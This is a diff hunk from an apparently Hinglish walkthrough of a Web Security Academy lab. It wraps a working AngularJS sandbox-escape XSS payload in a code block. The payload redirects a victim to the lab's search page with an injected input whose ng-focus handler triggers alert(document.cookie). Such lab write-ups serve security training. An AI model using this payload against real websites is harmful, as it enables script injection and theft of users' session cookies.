@@ -29,9 +29,11 @@ Lab open karo aur sidebar mein Exploit Server button dikh raha hoga — uspe cli
 
 🥈 Step 2: Yeh Payload Paste Karo
 
+```
 <script>
 location='https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cinput%20id=x%20ng-focus=$event.composedPath()|orderBy:%27(z=alert)(document.cookie)%27%3E#x';
 </script>
+```
 
 👉 YOUR-LAB-ID ko apne actual lab domain se replace karo (jo URL mein likha hota hai)
 
